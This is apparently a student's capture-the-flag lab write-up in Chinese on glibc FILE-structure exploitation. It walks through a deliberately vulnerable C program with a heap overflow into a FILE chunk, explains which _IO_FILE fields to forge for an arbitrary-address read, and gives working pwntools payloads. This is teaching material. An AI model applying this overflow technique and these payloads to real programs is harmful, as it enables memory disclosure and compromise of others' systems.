# lab_aar

1. 因為 FILE 在宣告後，會在 heap 建立一個空間，從原始碼中可以看到 FILE 宣告完後，就buf 就 malloc 0x10 的空間，然後給我們 read 0  輸入 0x1000 個 byte 進去 buf ，這邊就有很明顯的 bufferflow 可已利用在 heap 上面。

```cpp

char flag[0x10] = "FLAG{TEST}\n";
int main()
{
    FILE *fp;
    char *buf;

    buf = malloc(0x10);
    fp = fopen("/tmp/meow", "w");
    read(0, buf, 0x1000);
    fwrite(buf, 0x10, 1, fp);
    return 0;
}
```

1. 從圖中可以看到，0x290~0x2a0 是 buf 的 chunk ，0x2b0 之後是 FILE 的 chunk，研究了一下這邊的結構就是 FILE 的結構，我只要把 buf 裡面的值 overflow 到 FILE 的 chunk 後，就可以依序去改寫 FILE 的結構。

![截圖 2022-12-12 下午9.48.16.png](lab_aar%20217235e464af43fdab6a69c1f3ab1dca/%25E6%2588%25AA%25E5%259C%2596_2022-12-12_%25E4%25B8%258B%25E5%258D%25889.48.16.png)

```cpp
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain; /* Next */

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

3.至於要怎麼改寫 FILE 裡面的結構，研究了老師上課的講義的過程後，直接先用 example.c 的結論去設定我 FILE 的結構，而這邊在 fileno 之後，原本的資料也有設定進去，但不確定是哪裡有問題一直導致 segment falut，所以後來 payload 只有留至 fileno 之前，就成功了。

```cpp
void aar(FILE *fp, void *addr, int size)
{
    char buf[0x10] = "1234";
    fp->_flags = 0xfbad0800;
    fp->_IO_read_end = fp->_IO_write_base = addr;
    fp->_IO_write_ptr = (char *)addr + size;
    fp->_IO_write_end = 0;
    fp->_fileno = 1;
    fwrite(buf, 0x10, 1, fp);
}
```

```cpp
payload1 = flat(
    0x0, 0x0,
    0x0, 0x1e1,
    0xfbad0800, 0x0,
    0x404050, 0x0,
    0x404050, 0x404060,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0x7ffff7fbc5c0,
    0x1,
)
```

4.然後研究example.c 為什麼可以那樣設置，以下是我的理解過程

a. flags 是定義這個 FILE 結構的使用狀態權限跟屬性。

因為 aaw 是要把從 stdin 讀取的資料寫到特定位址，要控制的是 fread 的流程。

所以 flags 設置成

flags  & ~NO_READS 代表可讀
flags & ~EOF_SEEN 代表避免被視為 EOF

=>  flags &= ~(NO_READ | EOF_SEEN) : flags 設置為可讀，且避免被視為 EOF

flags |= MAGIC 魔數，通常用來判斷檔案有沒有被篡改

所以這裡得 FLAG 設置為以下，會得到 0xfbad0000

flags &= ~(NO_READ | EOF_SEEN)

flags |= MAGIC

![Untitled](lab_aar%20217235e464af43fdab6a69c1f3ab1dca/Untitled.png)

b. fileno = 1 ( 輸出到 stdout )

c. write_base 指向目標位址 ⇒ write_base = target_address

    write_ptr 設為 write_base + 資料大小 ⇒ write_ptr = write_base + size

    要避免執行 sys_seek，設置 read_end == write_base

    ⇒ write_end = 0 (滿足 write_end <= write_ptr)

   read_end = write_base = target_address

   write_ptr = target_address + target_size

5. 而我在研究 FILE struct 的過程中，發現 pwntools 中有 file pointer，可以用來做****FILE* structure exploitation，****所以我這邊也嘗試使用這個pwntools 提供的函式庫去寫 payload，背後的原理是一樣的，然後就也可以成功得到 FLAG。

[https://docs.pwntools.com/en/stable/filepointer.html](https://docs.pwntools.com/en/stable/filepointer.html)

```cpp
addr = 0x404050
size = 0x10
fileStr = FileStructure(0xdeadbeef)
fileStr.flags = 0xfbad0800
fileStr._IO_read_end = addr
fileStr._IO_write_base = addr
fileStr._IO_write_ptr = addr+size
fileStr._IO_write_end = 0
fileStr.chain = 0x7ffff7fbc5c0
fileStr.fileno = 1
payload2 = (flat(0x0,0x0,0x0,0x1e1,) + bytes(fileStr))[0:19*0x8]
```